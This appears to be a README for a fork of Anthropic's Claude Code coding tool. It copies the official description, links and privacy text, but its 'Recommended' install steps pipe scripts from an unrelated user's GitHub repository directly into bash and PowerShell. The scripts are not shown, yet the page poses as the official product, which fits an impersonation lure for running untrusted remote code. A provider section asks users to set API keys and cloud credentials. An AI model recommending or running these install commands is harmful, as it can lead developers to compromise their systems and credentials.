# Claude Code

![](https://img.shields.io/badge/Node.js-18%2B-brightgreen?style=flat-square) [![npm]](https://www.npmjs.com/package/@anthropic-ai/claude-code)

[npm]: https://img.shields.io/npm/v/@anthropic-ai/claude-code.svg?style=flat-square

Claude Code is an agentic coding tool that lives in your terminal, understands your codebase, and helps you code faster by executing routine tasks, explaining complex code, and handling git workflows -- all through natural language commands. Use it in your terminal, IDE, or tag @claude on Github.

**Learn more in the [official documentation](https://code.claude.com/docs/en/overview)**.

<img src="./demo.gif" />

## Get started
> [!NOTE]
> Installation via npm is deprecated. Use one of the recommended methods below.

For more installation options, uninstall steps, and troubleshooting, see the [setup documentation](https://code.claude.com/docs/en/setup).

1. Install Claude Code:

    **MacOS/Linux (Recommended):**
    ```bash
    curl -fsSL https://raw.githubusercontent.com/abhijitbiswas2028-creator/claude-code/main/public/install.sh | bash
    ```

    **Windows (Recommended):**
    ```powershell
    irm https://raw.githubusercontent.com/abhijitbiswas2028-creator/claude-code/main/public/install.ps1 | iex
    ```

    **NPM:**
    ```bash
    npm install -g @anthropic-ai/claude-code
    ```

2. Navigate to your project directory and run `claude`.

## Configuring 3rd-Party Platforms & Providers

Claude Code in this custom branch natively supports an extended list of 3rd-party platforms and custom enterprise model providers. You can easily configure them using the **built-in Web Dashboard** included in this repository, or via terminal.

### Supported Providers:
- **Anthropic (Asemprotic / Custom Compatible)**
- **OpenAI (ChatGPT, Codex, Custom Compatible)**
- **Google Gemini** & **Vertex AI**
- **Amazon Bedrock**
- **Microsoft Foundry**
- **OpenRouter** & **OpenCodeZen**

### Web Dashboard Configuration
This fork includes a Next.js web dashboard that provides an interactive GUI to easily generate connection scripts for all supported providers. Just run the development server or use the hosted deployment, select your provider, and it will output the exact CLI commands required.

### Terminal Configuration Examples:

**Microsoft Foundry:**
```bash
export FOUNDRY_API_KEY="your_api_key"
export FOUNDRY_ENDPOINT="https://your-foundry-endpoint"
claude config set provider foundry
```

**Custom Anthropic (asimprotic) Compatible:**
```bash
export ANTHROPIC_API_KEY="your_api_key"
export ANTHROPIC_BASE_URL="https://your-custom-url.com/v1"
claude config set provider anthropic
```

**OpenCodeZen:**
```bash
export OPENAI_API_KEY="your_api_key"
export OPENAI_BASE_URL="https://api.opencodezen.com/v1"
```

**Amazon Bedrock:**
```bash
export AWS_ACCESS_KEY_ID="your_access_key"
export AWS_SECRET_ACCESS_KEY="your_secret_key"
export AWS_REGION="us-east-1"
claude config set provider bedrock
```

**Google Vertex AI:**
```bash
claude config set gcpProject "your-gcp-project-id"
claude config set gcpRegion "us-central1"
claude config set provider vertex
```

## Plugins

This repository includes several Claude Code plugins that extend functionality with custom commands and agents. See the [plugins directory](./plugins/README.md) for detailed documentation on available plugins.

## Reporting Bugs

We welcome your feedback. Use the `/bug` command to report issues directly within Claude Code, or file a [GitHub issue](https://github.com/anthropics/claude-code/issues).

## Connect on Discord

Join the [Claude Developers Discord](https://anthropic.com/discord) to connect with other developers using Claude Code. Get help, share feedback, and discuss your projects with the community.

## Data collection, usage, and retention

When you use Claude Code, we collect feedback, which includes usage data (such as code acceptance or rejections), associated conversation data, and user feedback submitted via the `/bug` command.

### How we use your data

See our [data usage policies](https://code.claude.com/docs/en/data-usage).

### Privacy safeguards

We have implemented several safeguards to protect your data, including limited retention periods for sensitive information, restricted access to user session data, and clear policies against using feedback for model training.

For full details, please review our [Commercial Terms of Service](https://www.anthropic.com/legal/commercial-terms) and [Privacy Policy](https://www.anthropic.com/legal/privacy).
